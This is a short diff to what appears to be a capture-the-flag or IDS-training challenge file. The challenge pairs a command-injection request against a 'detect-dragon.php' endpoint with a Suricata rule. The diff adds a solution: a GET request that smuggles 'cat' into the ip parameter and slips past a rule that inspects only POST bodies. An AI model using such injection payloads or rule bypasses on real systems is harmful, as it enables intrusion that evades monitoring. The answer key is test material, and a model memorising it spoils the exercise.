@@ -19,8 +19,14 @@ base_request: |-
 
   ip=1.2.3.4; cat /app/dragon-detector-ai
 
+solution: |-
+  GET /detect-dragon.php?ip=1.2.3.4;cat+/app/dragon-detector-ai HTTP/1.1
+  Host: localhost
+  Content-Type: application/x-www-form-urlencoded
+
+solution_note: Only checks POST, not GET
+
 rules:
-# Only check POST
 - >
   alert http any any -> any any (msg:"Gotcha!"; flow:to_server,established; http.uri; content: "detect-dragon.php"; http.request_body; pcre: "/ip=[^&]*[\;|&`$()]/"; sid:123457; rev:1;)
 
